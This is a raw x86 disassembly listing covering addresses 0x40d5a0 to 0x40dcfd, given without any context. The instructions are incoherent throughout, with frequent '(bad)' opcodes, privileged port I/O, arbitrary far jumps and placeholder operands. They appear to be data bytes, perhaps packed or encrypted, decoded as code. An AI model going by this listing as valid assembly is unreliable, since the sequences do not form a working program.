  40d5a0:	sbb    al,0x6e
  40d5a2:	jl     0x40d5f8
  40d5a4:	and    al,0x6e
  40d5a6:	xchg   edi,eax
  40d5a7:	std    
  40d5a8:	cs fcmovnb st,st(7)
  40d5ab:	mov    ecx,0xaad00c09
  40d5b0:	nop
  40d5b1:	cld    
  40d5b2:	(bad)  
  40d5b3:	pop    esp
  40d5b4:	call   0xe00464d6
  40d5b9:	xor    al,0x95
  40d5bb:	or     bh,BYTE PTR [edi]
  40d5bd:	or     eax,0x950e72
  40d5c2:	or     al,0x9e
  40d5c4:	push   cs
  40d5c5:	iret   
  40d5c6:	lds    eax,FWORD PTR [edx]
  40d5c8:	jle    0x40d553
  40d5ca:	call   FWORD PTR [edi-0x36]
  40d5cd:	xchg   ebp,eax
  40d5ce:	or     eax,0xb187e156
  40d5d3:	sbb    dl,cl
  40d5d5:	out    dx,eax
  40d5d6:	add    DWORD PTR [ecx+eiz*4],ebx
  40d5d9:	int3   
  40d5da:	(bad)  
  40d5de:	loop   0x40d651
  40d5e0:	or     BYTE PTR [eax],dl
  40d5e2:	mov    edi,0x25ead94e
  40d5e7:	and    eax,0xfb7e0f1
  40d5ec:	cmc    
  40d5ed:	fistp  WORD PTR [edi+0x46]
  40d5f0:	mov    esp,0x2e29fcc2
  40d5f5:	fadd   QWORD PTR ss:[eax-0x71]
  40d5f9:	int3   
  40d5fa:	mov    edi,esp
  40d5fc:	sub    BYTE PTR [esp+ebx*4],dl
  40d5ff:	mov    eax,0x979863dc
  40d604:	or     al,0xf7
  40d606:	mov    ch,0x49
  40d608:	rcr    al,cl
  40d60a:	push   ds
  40d60b:	mov    cl,0xf3
  40d60d:	das    
  40d60e:	adc    BYTE PTR [ebx],0x3b
  40d611:	or     BYTE PTR [ebx-0x6f],cl
  40d614:	or     al,0x5c
  40d616:	jmp    0xc0fb:0xcdc793c7
  40d61d:	pop    ebx
  40d61e:	lods   al,BYTE PTR ds:[esi]
  40d61f:	xor    dh,BYTE PTR [esp+ecx*8]
  40d622:	push   ds
  40d623:	inc    eax
  40d624:	mov    ah,0x24
  40d626:	mov    ebx,edi
  40d628:	cmp    DWORD PTR [edx],edx
  40d62a:	xchg   DWORD PTR [esi],ebp
  40d62c:	loopne 0x40d5df
  40d62e:	ffreep st(7)
  40d630:	add    edi,eax
  40d632:	ror    DWORD PTR [eax],cl
  40d634:	jl     0x40d652
  40d636:	xor    edi,DWORD PTR [eax-0x4a3086f3]
  40d63c:	pop    ebx
  40d63d:	xor    al,0x3e
  40d63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d640:	pop    eax
  40d641:	mov    ah,0xff
  40d643:	sub    eax,0xdeead70a
  40d648:	sub    eax,0xbb596b36
  40d64d:	retf   0x4f36
  40d650:	pop    es
  40d651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d652:	aas    
  40d653:	call   0xbff740ed
  40d658:	cmp    BYTE PTR [eax],cl
  40d65a:	(bad)  
  40d65b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d65c:	mov    dl,0x54
  40d65e:	push   0x56
  40d660:	inc    ebp
  40d661:	dec    esi
  40d662:	cmp    edx,DWORD PTR [esi+eiz*8-0x4016682b]
  40d669:	cld    
  40d66a:	aaa    
  40d66b:	sbb    ebp,eax
  40d66d:	sub    eax,0x4d3f88d3
  40d672:	mov    DWORD PTR [edx],0x8140be3a
  40d678:	mov    ds:0xfa2600bd,al
  40d67d:	add    dl,BYTE PTR [ebx-0x7b76f0a9]
  40d683:	fnsave [esi+0x18]
  40d686:	adc    esp,esi
  40d688:	ja     0x40d69b
  40d68a:	push   esp
  40d68b:	add    eax,0xa526d0d5
  40d690:	ss sub al,0xa1
  40d693:	jns    0x40d6ec
  40d695:	pop    es
  40d696:	shr    BYTE PTR [ecx-0x7b],0xc6
  40d69a:	es call 0xd603635a
  40d6a0:	fld    QWORD PTR [eax-0x3f2a6fdf]
  40d6a6:	call   0x8663:0xf6e09a58
  40d6ad:	and    bh,BYTE PTR [eax+0x564ae5ab]
  40d6b3:	mov    eax,0x2c55bd45
  40d6b8:	xor    BYTE PTR [edi+0x4f6b01f7],al
  40d6be:	scas   eax,DWORD PTR es:[edi]
  40d6bf:	pop    edx
  40d6c0:	or     DWORD PTR [edx+edi*2+0x733a85e9],0x24
  40d6c8:	aad    0x83
  40d6ca:	call   0x1d15:0x4e67fe6a
  40d6d1:	jle    0x40d682
  40d6d3:	xchg   ecx,eax
  40d6d4:	xchg   edx,eax
  40d6d5:	enter  0x76bb,0x89
  40d6d9:	cwde   
  40d6da:	shr    cl,0x56
  40d6dd:	sbb    al,0xcd
  40d6df:	jecxz  0x40d6bf
  40d6e1:	xlat   BYTE PTR ds:[ebx]
  40d6e2:	sahf   
  40d6e3:	sbb    al,0x6e
  40d6e5:	cli    
  40d6e6:	xchg   ebx,eax
  40d6e7:	cmc    
  40d6e8:	js     0x40d6f7
  40d6ea:	sahf   
  40d6eb:	(bad)  
  40d6ec:	pushf  
  40d6ed:	and    BYTE PTR [ecx+0x7ba0d4cb],dh
  40d6f3:	out    dx,eax
  40d6f4:	mov    ds:0x3b437efb,eax
  40d6f9:	mov    ah,BYTE PTR [ebp+ebp*4-0x6eb6d3c3]
  40d700:	outs   dx,BYTE PTR ds:[esi]
  40d701:	leave  
  40d702:	sub    DWORD PTR [ebx-0x25],edx
  40d705:	inc    eax
  40d706:	fmul   QWORD PTR ds:0x4525893b
  40d70c:	es mov edi,0xdea5380e
  40d712:	les    edi,FWORD PTR [edi-0xec4b292]
  40d718:	dec    ecx
  40d719:	icebp  
  40d71a:	mov    ah,0xd5
  40d71c:	loopne 0x40d747
  40d71e:	call   0xd0dece12
  40d723:	repz mov eax,0xb0c03cce
  40d729:	adc    dl,BYTE PTR [edx+0x73644957]
  40d72f:	jo     0x40d76d
  40d731:	mov    edx,0x297ccfb6
  40d736:	enter  0x18c3,0xf0
  40d73a:	sub    ebp,DWORD PTR [edi]
  40d73c:	cld    
  40d73d:	and    ah,bl
  40d73f:	mov    BYTE PTR [ebx],bl
  40d741:	cmp    BYTE PTR [ebx+0x5a97f60d],bl
  40d747:	xor    al,0x1c
  40d749:	imul   DWORD PTR [ecx-0x6639816]
  40d74f:	or     al,0x82
  40d751:	push   0xd969ae8
  40d756:	mov    eax,0xdfece72a
  40d75b:	cli    
  40d75c:	jmp    0x8fb90564
  40d761:	cmp    esp,DWORD PTR [edi+0x9]
  40d764:	xchg   esp,eax
  40d765:	dec    ebx
  40d766:	jb     0x40d71e
  40d768:	aaa    
  40d769:	adc    eax,0x950214a8
  40d76e:	sbb    BYTE PTR [edx+0x44],dh
  40d771:	shl    DWORD PTR [eax],cl
  40d773:	pop    ss
  40d774:	repnz mov esp,0xdb75a430
  40d77a:	test   al,0x52
  40d77c:	adc    DWORD PTR [edx+0x73eb010d],esp
  40d782:	rcl    DWORD PTR [eax-0x4a],1
  40d785:	jmp    0x40d788
  40d787:	adc    al,0x13
  40d789:	pop    edx
  40d78a:	xor    DWORD PTR [edi],eax
  40d78c:	xor    eax,0x56ef3f69
  40d791:	jecxz  0x40d7fc
  40d793:	inc    eax
  40d794:	(bad)  
  40d795:	loopne 0x40d7d8
  40d797:	retf   0x888b
  40d79a:	dec    ebx
  40d79b:	mov    ch,0xa2
  40d79d:	fst    DWORD PTR [edx]
  40d79f:	cmp    BYTE PTR [esi-0x34],al
  40d7a2:	push   0xa30650b9
  40d7a7:	cwde   
  40d7a8:	pushf  
  40d7a9:	ds or  al,cl
  40d7ac:	stos   DWORD PTR es:[edi],eax
  40d7ad:	mov    edi,0x41b2447b
  40d7b2:	or     DWORD PTR [ecx+edi*1],esp
  40d7b5:	mov    al,ds:0x33403664
  40d7ba:	ins    BYTE PTR es:[edi],dx
  40d7bb:	fs std 
  40d7bd:	(bad)  
  40d7be:	aaa    
  40d7bf:	inc    ebp
  40d7c0:	mov    ?,ebx
  40d7c2:	sbb    ch,BYTE PTR [edx]
  40d7c4:	fwait
  40d7c5:	and    DWORD PTR [edi],0x346021d
  40d7cb:	sub    al,0x7a
  40d7cd:	sbb    al,0x98
  40d7cf:	sub    DWORD PTR [edi],esi
  40d7d1:	call   0xd0f63372
  40d7d6:	push   0x6d0f6c6c
  40d7db:	pop    esp
  40d7dc:	or     eax,0xf4693902
  40d7e1:	sbb    DWORD PTR [edx+eax*8-0x5f],esp
  40d7e5:	call   0xdf99:0xff20b4c4
  40d7ec:	aam    0x74
  40d7ee:	ja     0x40d7f8
  40d7f0:	fild   WORD PTR [eax]
  40d7f2:	fcomip st,st(2)
  40d7f4:	(bad)  
  40d7f5:	jae    0x40d840
  40d7f7:	sbb    al,0x3
  40d7f9:	loopne 0x40d785
  40d7fb:	add    DWORD PTR [ebp+0x13],ecx
  40d7fe:	cwde   
  40d7ff:	pusha  
  40d800:	xchg   BYTE PTR [edi-0x51a76d4f],cl
  40d806:	sbb    eax,0xc23938bc
  40d80b:	(bad)  
  40d80d:	mov    BYTE PTR [ebp+0x15d799c6],dl
  40d813:	pop    ss
  40d814:	pop    es
  40d815:	cld    
  40d816:	inc    ebp
  40d817:	pop    ebp
  40d818:	lds    edx,FWORD PTR [ebp+0x1e]
  40d81b:	xchg   edi,eax
  40d81c:	pop    ss
  40d81d:	daa    
  40d81e:	jbe    0x40d7c5
  40d820:	xchg   edx,eax
  40d821:	daa    
  40d822:	mov    ds:0x6cfb1037,eax
  40d827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d828:	ds mov ch,0xc2
  40d82b:	ja     0x40d8a0
  40d82d:	je     0x40d82a
  40d82f:	stos   BYTE PTR es:[edi],al
  40d830:	leave  
  40d831:	scas   al,BYTE PTR es:[edi]
  40d832:	push   esi
  40d833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d834:	adc    al,0x1d
  40d836:	mov    ebx,0xae21fc56
  40d83b:	adc    BYTE PTR [ebx+ebp*1+0x14],0x28
  40d840:	in     al,dx
  40d841:	repnz add al,0xe5
  40d844:	fld    QWORD PTR [ebx+0x7d1e2c8c]
  40d84a:	sub    ebx,0x5d
  40d84d:	pop    ds
  40d84e:	and    BYTE PTR [ebp-0xb71fb89],ch
  40d854:	arpl   cx,bx
  40d856:	outs   dx,DWORD PTR ds:[esi]
  40d857:	ror    DWORD PTR [edx],1
  40d859:	rcl    BYTE PTR [ebp-0x47],0x7c
  40d85d:	dec    ebx
  40d85e:	leave  
  40d85f:	sar    cl,1
  40d861:	enter  0x62f7,0x65
  40d865:	sub    esp,esp
  40d867:	and    cl,dh
  40d869:	(bad)  
  40d86a:	inc    ecx
  40d86b:	cmc    
  40d86c:	int    0xc7
  40d86e:	ins    BYTE PTR es:[edi],dx
  40d86f:	cmp    eax,0xbc880226
  40d874:	aad    0xba
  40d876:	lods   al,BYTE PTR ds:[esi]
  40d877:	scas   ax,WORD PTR es:[edi]
  40d879:	add    eax,DWORD PTR [ebx+0x66]
  40d87c:	dec    ecx
  40d87d:	inc    ecx
  40d87e:	pop    esi
  40d87f:	mov    WORD PTR [si],gs
  40d882:	(bad)  
  40d883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d884:	out    0xf5,al
  40d886:	inc    esp
  40d887:	dec    ebp
  40d888:	loopne 0x40d899
  40d88a:	jp     0x40d84b
  40d88c:	add    eax,0xe79a49ce
  40d891:	xlat   BYTE PTR ds:[ebx]
  40d892:	mul    ecx
  40d894:	mov    eax,0x83a6f459
  40d899:	jecxz  0x40d905
  40d89b:	(bad)  
  40d89c:	loopne 0x40d90c
  40d89e:	mov    es:0xeec2fdd4,al
  40d8a4:	jae    0x40d8e2
  40d8a6:	push   ds
  40d8a7:	loope  0x40d892
  40d8a9:	adc    BYTE PTR [ebx+ebx*8],cl
  40d8ac:	and    BYTE PTR [ecx+0x2a],bh
  40d8af:	sub    eax,edx
  40d8b1:	shl    DWORD PTR [ebx],1
  40d8b3:	and    eax,0xaa63b4bf
  40d8b8:	sti    
  40d8b9:	add    BYTE PTR [esi],bl
  40d8bb:	(bad)  
  40d8bc:	jge    0x40d919
  40d8be:	dec    esi
  40d8bf:	add    al,0x39
  40d8c1:	dec    eax
  40d8c2:	aam    0xa2
  40d8c4:	mov    cl,0x9c
  40d8c6:	rcr    BYTE PTR [edi],cl
  40d8c8:	inc    esi
  40d8c9:	leave  
  40d8ca:	cs jp  0x40d920
  40d8cd:	mov    bl,0x28
  40d8cf:	jbe    0x40d85b
  40d8d1:	lods   al,BYTE PTR ds:[esi]
  40d8d2:	pop    ss
  40d8d3:	cmp    al,0x4f
  40d8d5:	fs in  al,dx
  40d8d7:	cld    
  40d8d8:	ds (bad) 
  40d8db:	ret    
  40d8dc:	lods   al,BYTE PTR ds:[esi]
  40d8dd:	fcomp  st(4)
  40d8df:	xchg   DWORD PTR [ebp+0x52],esi
  40d8e2:	jl     0x40d933
  40d8e4:	mov    bh,BYTE PTR [ecx-0x60]
  40d8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8e8:	mov    ebx,0x69636606
  40d8ed:	sbb    ebx,DWORD PTR [edi]
  40d8ef:	cld    
  40d8f0:	mov    ebx,eax
  40d8f2:	aad    0x13
  40d8f4:	xchg   BYTE PTR [ecx-0x2a],dh
  40d8f7:	xchg   ecx,eax
  40d8f8:	test   DWORD PTR [edi],ebp
  40d8fa:	push   eax
  40d8fb:	mov    dh,0x5d
  40d8fd:	and    BYTE PTR [eax-0x53],cl
  40d900:	pop    eax
  40d901:	rcl    DWORD PTR [ebx+0x19],0xb2
  40d905:	jae    0x40d916
  40d907:	or     eax,ebp
  40d909:	ficom  DWORD PTR [edx+0x67]
  40d90c:	sub    DWORD PTR [edx+eax*4],edi
  40d90f:	and    eax,0x354a7862
  40d914:	cmp    BYTE PTR [edx+ebx*4-0x75],bl
  40d918:	rol    DWORD PTR [ebp-0x1ff0ad22],0x8c
  40d91f:	icebp  
  40d920:	mov    edx,0x2ae5ed69
  40d925:	hlt    
  40d926:	fdivr  st,st(6)
  40d928:	mov    DWORD PTR [ebp-0x7f295bfd],ebx
  40d92e:	jne    0x40d944
  40d930:	cmp    BYTE PTR [ecx+0x71],ah
  40d933:	repnz xor DWORD PTR [esi+ebx*8],eax
  40d937:	pop    ecx
  40d938:	sti    
  40d939:	xchg   ebx,eax
  40d93a:	or     BYTE PTR [edi+0x4985e74c],ch
  40d940:	retf   0x1267
  40d943:	push   eax
  40d944:	pushf  
  40d945:	mov    ds:0xb935286d,eax
  40d94a:	test   al,0x42
  40d94c:	mul    esi
  40d94e:	xchg   esp,eax
  40d94f:	sub    edi,eax
  40d951:	cmp    eax,0xe588118e
  40d956:	xor    bh,BYTE PTR ds:0x55bedabd
  40d95c:	xchg   DWORD PTR ds:0xd6e99fe0,eax
  40d962:	loopne 0x40d9e1
  40d964:	out    0x4,al
  40d966:	mov    ch,0xd0
  40d968:	mov    ah,BYTE PTR [esi]
  40d96a:	mov    cs,ebp
  40d96c:	and    al,0x96
  40d96e:	(bad)  
  40d96f:	mov    ah,0x4c
  40d971:	out    dx,al
  40d972:	lahf   
  40d973:	in     al,0x2d
  40d975:	add    ebp,DWORD PTR [edx-0x44]
  40d978:	inc    ecx
  40d979:	mov    ebx,0xc8028036
  40d97e:	push   ecx
  40d97f:	cli    
  40d980:	pop    ss
  40d981:	dec    ebx
  40d982:	neg    BYTE PTR [ecx+eiz*4]
  40d985:	mov    bl,0x35
  40d987:	lock scas eax,DWORD PTR es:[edi]
  40d989:	pop    edi
  40d98a:	mov    cl,0x8e
  40d98c:	ins    BYTE PTR es:[edi],dx
  40d98d:	jb     0x40d9df
  40d98f:	push   edx
  40d990:	sbb    dh,BYTE PTR [ebx+esi*2]
  40d993:	test   ah,ah
  40d995:	popa   
  40d996:	leave  
  40d997:	rcl    esp,0x2f
  40d99a:	mov    ebp,0x83e8de8a
  40d99f:	scas   eax,DWORD PTR es:[edi]
  40d9a0:	adc    BYTE PTR [ecx],0x2d
  40d9a3:	dec    eax
  40d9a4:	jge    0x40d9e2
  40d9a6:	fwait
  40d9a7:	xchg   esp,eax
  40d9a8:	loopne 0x40d9fd
  40d9aa:	sbb    DWORD PTR [eax+0x1e],eax
  40d9ad:	jg     0x40d9d2
  40d9af:	ret    
  40d9b0:	pushf  
  40d9b1:	xchg   edx,eax
  40d9b2:	add    eax,0xbd923c53
  40d9b7:	or     ecx,0x7881f694
  40d9bd:	bound  edx,QWORD PTR [esi]
  40d9bf:	mov    esp,0xec0a0653
  40d9c4:	jbe    0x40d96a
  40d9c6:	pop    ds
  40d9c7:	push   esp
  40d9c8:	pop    es
  40d9c9:	mov    esp,0x307a1897
  40d9ce:	bound  edi,QWORD PTR [edi-0x3566e954]
  40d9d4:	les    ecx,FWORD PTR cs:[edx-0x31]
  40d9d8:	mov    dl,BYTE PTR [eax]
  40d9da:	daa    
  40d9db:	js     0x40d9d7
  40d9dd:	punpckhwd mm2,QWORD PTR [eax]
  40d9e0:	iret   
  40d9e1:	in     eax,dx
  40d9e2:	or     eax,0x97406bb4
  40d9e7:	dec    esp
  40d9e8:	fs jno 0x40d986
  40d9eb:	outs   dx,BYTE PTR ds:[esi]
  40d9ec:	mov    edx,0x67d24201
  40d9f1:	dec    ecx
  40d9f2:	pop    eax
  40d9f3:	test   BYTE PTR [ebp+0x6e908a5f],ch
  40d9f9:	test   eax,0x4eb25842
  40d9fe:	or     BYTE PTR [edx-0x71],dl
  40da01:	pop    ds
  40da02:	jmp    0x40da58
  40da04:	xchg   edi,eax
  40da05:	or     dl,BYTE PTR [edx+edx*8]
  40da08:	or     eax,DWORD PTR [esi-0x25]
  40da0b:	(bad)  
  40da0c:	stc    
  40da0d:	repz push esp
  40da0f:	pop    ss
  40da10:	jne    0x40da8d
  40da12:	mov    WORD PTR fs:[edx],?
  40da15:	fild   WORD PTR [edx+0x67c57e9c]
  40da1b:	mov    ds:0x9e9f4bf0,eax
  40da20:	sbb    dl,BYTE PTR [ecx]
  40da22:	jmp    0x40da17
  40da24:	pop    ss
  40da25:	sbb    eax,0x12adb60d
  40da2a:	inc    ebp
  40da2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2c:	sbb    BYTE PTR [ebx+0x484640a],0xf6
  40da33:	fst    QWORD PTR [edi]
  40da35:	outs   dx,DWORD PTR ds:[esi]
  40da36:	and    al,0xee
  40da38:	fmul   QWORD PTR [ecx]
  40da3a:	dec    edx
  40da3b:	push   ss
  40da3c:	and    eax,0x3863a244
  40da41:	stos   DWORD PTR es:[edi],eax
  40da42:	retf   0x74d5
  40da45:	stc    
  40da46:	loop   0x40da1b
  40da48:	mov    esi,0xf1dc2e6a
  40da4d:	push   cs
  40da4e:	(bad)  
  40da4f:	sbb    bl,BYTE PTR ds:[ecx-0x319e9544]
  40da56:	sub    al,0x9b
  40da58:	jmp    0x43ad:0x21e0b699
  40da5f:	daa    
  40da60:	sahf   
  40da61:	aam    0x1b
  40da63:	mov    ebx,0x2d29fed
  40da68:	fcom   DWORD PTR [eax]
  40da6a:	add    esp,DWORD PTR [eax+0x14]
  40da6d:	mov    WORD PTR [ebx+ebp*1+0x572c9ef],?
  40da74:	ret    0xae83
  40da77:	pop    edx
  40da78:	jmp    0xd115306
  40da7d:	xlat   BYTE PTR ds:[ebx]
  40da7e:	std    
  40da7f:	xor    cl,bh
  40da81:	mov    ds:0xfcc06f85,al
  40da86:	or     DWORD PTR [eax],ebx
  40da88:	out    0xd6,eax
  40da8a:	cmp    DWORD PTR [edi+0x71],edi
  40da8d:	add    bh,0x2d
  40da90:	(bad)  
  40da91:	push   eax
  40da92:	in     al,dx
  40da93:	scas   eax,DWORD PTR es:[edi]
  40da94:	sbb    BYTE PTR [esp+edi*4-0xf],0x7a
  40da99:	inc    esp
  40da9a:	sub    dl,BYTE PTR [edi*4+0x4925a380]
  40daa1:	leave  
  40daa2:	dec    ecx
  40daa3:	mov    ebx,0x73ecd3b9
  40daa8:	retf   0xe1d6
  40daab:	out    dx,eax
  40daac:	xchg   DWORD PTR [ecx],eax
  40daae:	gs (bad) 
  40dab0:	lock jno 0x40daa8
  40dab3:	pop    ds
  40dab4:	mov    esp,0x8ca4ca43
  40dab9:	out    0x79,eax
  40dabb:	mov    WORD PTR [edx-0x7],ds
  40dabe:	jge    0x40da81
  40dac0:	jno    0x40da5f
  40dac2:	xchg   BYTE PTR [edi+eiz*8],al
  40dac5:	loopne 0x40db15
  40dac7:	pop    esi
  40dac8:	xchg   DWORD PTR [esp+edi*2],ecx
  40dacb:	cmp    esp,eax
  40dacd:	dec    edi
  40dace:	mov    dl,0x6b
  40dad0:	push   0x912bc259
  40dad5:	lea    edi,[ebx-0x33]
  40dad8:	into   
  40dad9:	pop    ecx
  40dada:	adc    al,0x36
  40dadc:	pop    esi
  40dadd:	add    BYTE PTR [ecx+eax*8-0x52f67746],0x13
  40dae5:	outs   dx,BYTE PTR ds:[esi]
  40dae6:	enter  0x9d2a,0x7
  40daea:	stos   DWORD PTR es:[edi],eax
  40daeb:	ins    BYTE PTR es:[edi],dx
  40daec:	and    cl,BYTE PTR [ebx+ecx*8]
  40daef:	jge    0x40daa3
  40daf1:	mov    esp,0x74eb4a16
  40daf6:	sar    DWORD PTR [ecx],1
  40daf8:	and    bh,BYTE PTR [edx]
  40dafa:	cwde   
  40dafb:	lds    ebp,FWORD PTR [ecx+esi*2+0x56]
  40daff:	mov    es,WORD PTR [ecx-0x4caf239f]
  40db05:	and    dl,bh
  40db07:	outs   dx,BYTE PTR ds:[esi]
  40db08:	es cli 
  40db0a:	loop   0x40db65
  40db0c:	cmp    eax,0x4bca7e85
  40db11:	sbb    BYTE PTR [edi],dh
  40db13:	jae    0x40db0a
  40db15:	jns    0x40daef
  40db17:	dec    ebx
  40db18:	outs   dx,BYTE PTR ds:[esi]
  40db19:	out    dx,eax
  40db1a:	adc    cl,BYTE PTR [esi+0x3a]
  40db1d:	ja     0x40db3e
  40db1f:	cli    
  40db20:	dec    eax
  40db21:	mov    dh,BYTE PTR [ebx]
  40db23:	popa   
  40db24:	mov    esp,0x5057e064
  40db29:	inc    ebp
  40db2a:	fsub   QWORD PTR [esi+0x54]
  40db2d:	mov    eax,ds:0x1bf5df9b
  40db32:	or     ch,BYTE PTR [eax+ecx*8]
  40db35:	ret    0xa7a4
  40db38:	inc    ebp
  40db39:	push   0xaa80f6bb
  40db3e:	xchg   DWORD PTR [edx+0x9d766c8],edi
  40db44:	jmp    0x40db1e
  40db46:	jns    0x40dbc4
  40db48:	das    
  40db49:	xchg   ebp,eax
  40db4a:	lea    ecx,[ebp+0x12]
  40db4d:	nop
  40db4e:	cmp    esp,DWORD PTR [eax-0x1]
  40db51:	imul   esi,DWORD PTR [edx],0x7a
  40db54:	inc    edx
  40db55:	gs xchg ebp,eax
  40db57:	(bad)  
  40db58:	ror    BYTE PTR [ecx-0x104ab103],cl
  40db5e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40db60:	pop    edi
  40db61:	mov    dl,0x1c
  40db63:	(bad)  
  40db64:	sbb    eax,0x9f8f89e2
  40db69:	call   0x7d7a:0xb125704
  40db70:	dec    ecx
  40db71:	ds ds mov bl,0x87
  40db75:	lods   al,BYTE PTR ds:[esi]
  40db76:	(bad)  
  40db77:	out    0xf8,eax
  40db79:	lods   al,BYTE PTR ds:[esi]
  40db7a:	adc    bl,0x78
  40db7d:	mov    ecx,0xfd45770d
  40db82:	and    edx,DWORD PTR [esi]
  40db84:	retf   0x84ca
  40db87:	add    BYTE PTR [edx+0xc],bl
  40db8a:	jl     0x40db27
  40db8c:	rcr    DWORD PTR [ebx+0x60720760],1
  40db92:	jl     0x40dc13
  40db94:	jnp    0x40dbd0
  40db96:	pop    ds
  40db97:	sar    BYTE PTR [edi],1
  40db99:	cwde   
  40db9a:	out    dx,eax
  40db9b:	jne    0xd41969d8
  40dba1:	mov    al,0x71
  40dba3:	jg     0x40db42
  40dba5:	or     ah,cl
  40dba7:	jae    0x40dbe6
  40dba9:	(bad)
  40dbad:	shl    edx,0x33
  40dbb0:	ficomp WORD PTR [ebx+0x8]
  40dbb3:	mov    cl,0x94
  40dbb5:	outs   dx,BYTE PTR ds:[esi]
  40dbb6:	out    0x83,eax
  40dbb8:	jns    0x40dbba
  40dbba:	mov    eax,ds:0xec39d831
  40dbbf:	or     dh,BYTE PTR [ecx*8+0x1bb50137]
  40dbc6:	push   ecx
  40dbc7:	mov    ch,0x47
  40dbc9:	mov    ecx,ebx
  40dbcb:	and    esi,DWORD PTR [ecx-0x8]
  40dbce:	mov    al,0x7
  40dbd0:	fld    TBYTE PTR [ebx+0x57]
  40dbd3:	loopne 0x40db8c
  40dbd5:	pusha  
  40dbd6:	mov    ah,0x72
  40dbd8:	outs   dx,BYTE PTR ds:[esi]
  40dbd9:	mov    esp,0x289c4cc5
  40dbde:	xchg   edx,eax
  40dbdf:	ins    BYTE PTR es:[edi],dx
  40dbe0:	mov    al,ds:0x97eafd5a
  40dbe5:	inc    ecx
  40dbe6:	or     al,0xd
  40dbe8:	inc    ecx
  40dbe9:	jl     0x40dbb5
  40dbeb:	out    dx,al
  40dbec:	mov    bl,0x26
  40dbee:	das    
  40dbef:	push   cs
  40dbf0:	fwait
  40dbf1:	out    dx,eax
  40dbf2:	popa   
  40dbf3:	mov    BYTE PTR [edi],ah
  40dbf5:	mov    WORD PTR [edi+0x8155f8],cs
  40dbfb:	inc    ebx
  40dbfc:	ret    0x1564
  40dbff:	leave  
  40dc00:	cmp    al,0x69
  40dc02:	add    BYTE PTR [ebx-0x6c2dd6ab],bh
  40dc08:	mov    edx,0xa197a002
  40dc0d:	lods   eax,DWORD PTR ds:[esi]
  40dc0e:	pop    edi
  40dc0f:	jae    0x40dc78
  40dc11:	mov    ebp,0x8e8101f0
  40dc16:	xchg   ebx,eax
  40dc17:	shl    DWORD PTR fs:[ebx],0xf
  40dc1b:	dec    esp
  40dc1c:	sahf   
  40dc1d:	mov    ds,WORD PTR [ebp+eax*2+0x2e]
  40dc21:	(bad)  
  40dc22:	pushf  
  40dc23:	test   eax,0xd3abe0bc
  40dc28:	inc    ecx
  40dc29:	in     al,0x12
  40dc2b:	jne    0x40dc36
  40dc2d:	and    bl,ch
  40dc2f:	mov    WORD PTR [edi+edx*4-0x52f6ad4e],cs
  40dc36:	cmc    
  40dc37:	inc    ebx
  40dc38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc39:	mov    ebp,0x6d1772e2
  40dc3e:	push   edi
  40dc3f:	mov    dh,0x85
  40dc41:	ja     0x40dca4
  40dc43:	mov    edi,0x18f8edd7
  40dc48:	adc    al,ah
  40dc4a:	mov    ebx,0x6bf7385e
  40dc4f:	xchg   esi,eax
  40dc50:	into   
  40dc51:	or     al,0x6c
  40dc53:	add    al,0x46
  40dc55:	dec    ebx
  40dc56:	into   
  40dc57:	sub    al,0xd0
  40dc59:	dec    edx
  40dc5a:	daa    
  40dc5b:	sub    edi,0x31
  40dc5e:	pusha  
  40dc5f:	inc    ebx
  40dc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc62:	xor    BYTE PTR [edi-0xdc3fe01],bl
  40dc68:	mov    BYTE PTR [ebp+0x71],bl
  40dc6b:	push   esi
  40dc6c:	inc    esp
  40dc6d:	and    eax,0x4abfdec
  40dc72:	fimul  WORD PTR [edi+ebp*2+0x15]
  40dc76:	fsubrp st(7),st
  40dc78:	jnp    0x40dc12
  40dc7a:	(bad)  
  40dc7c:	and    edx,ebx
  40dc7e:	call   0x1416:0x4b4b8fa1
  40dc85:	retf   
  40dc86:	xchg   esi,eax
  40dc87:	call   0xd0feba0d
  40dc8c:	pop    eax
  40dc8d:	adc    BYTE PTR [ebx+0x3a599e7a],bh
  40dc93:	xchg   edx,eax
  40dc94:	and    DWORD PTR [edx+0xe91bb5d],esp
  40dc9a:	stos   DWORD PTR es:[edi],eax
  40dc9b:	rcr    BYTE PTR [ebp+0x77],0x8a
  40dc9f:	jge    0x40dc34
  40dca1:	imul   esp,esi,0x22
  40dca4:	ins    DWORD PTR es:[edi],dx
  40dca5:	outs   dx,DWORD PTR ds:[esi]
  40dca6:	jg     0x40dc83
  40dca8:	jg     0x40dcca
  40dcaa:	jp     0x40dcfa
  40dcac:	(bad)  
  40dcad:	adc    al,0x2e
  40dcaf:	out    dx,al
  40dcb0:	dec    esp
  40dcb1:	aad    0xaf
  40dcb3:	or     BYTE PTR [ebp+0xff6b828],ch
  40dcb9:	xor    DWORD PTR [ecx],ebp
  40dcbb:	inc    edi
  40dcbc:	popf   
  40dcbd:	and    BYTE PTR [eax],ah
  40dcbf:	sbb    BYTE PTR [edx-0x72],dl
  40dcc2:	mov    ah,0x37
  40dcc4:	aad    0x1a
  40dcc6:	push   ecx
  40dcc7:	xchg   DWORD PTR [edx+eax*8-0x64],esi
  40dccb:	xor    BYTE PTR [esi-0x4226c383],al
  40dcd1:	or     ebx,ecx
  40dcd3:	mov    eax,0xf4e83c70
  40dcd8:	jmp    0xabfb162b
  40dcdd:	push   eax
  40dcde:	retf   
  40dcdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dce0:	jmp    0x806d:0x87e2e270
  40dce7:	mov    ah,0xdb
  40dce9:	mov    BYTE PTR [ebx],0xe9
  40dcec:	in     eax,0x37
  40dcee:	mov    dl,0xbb
  40dcf0:	mov    esi,0xd4ee18f3
  40dcf5:	sbb    ch,BYTE PTR [ecx-0xb]
  40dcf8:	push   ecx
  40dcf9:	aas    
  40dcfa:	imul   ebx,DWORD PTR [edi],0x32
  40dcfd:	jmp    0x40dc7f
